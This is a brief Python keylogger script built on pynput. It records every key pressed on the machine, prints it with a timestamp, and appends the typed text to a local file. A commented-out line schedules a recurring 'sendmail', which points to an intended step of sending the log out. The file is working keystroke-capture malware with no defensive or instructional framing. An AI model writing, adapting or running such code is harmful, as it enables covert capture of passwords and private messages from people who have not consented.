import pip
from pynput import keyboard
#import schedule
import os
from time import strftime,gmtime
import datetime


def on_press(key):
    print(datetime.datetime.now().strftime("%H:%M:%S"))
    try:
        f=open('output.txt',"a")
        f.write(key.char)
        #schedule.every(1).minutes.do(sendmail)
        print('alphanumeric key {0} pressed'.format(key.char))

    except AttributeError:
        print('special key {0} pressed'.format(key))
        #print(keyboard.KeyCode)
        if key==keyboard.Key.space:
            f.write(' ')
        if key==keyboard.Key.enter:
            f.write(os.linesep)
        if key==keyboard.Key.esc:
            f.seek(-1,os.SEEK_CUR)
            f.write('')

    

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
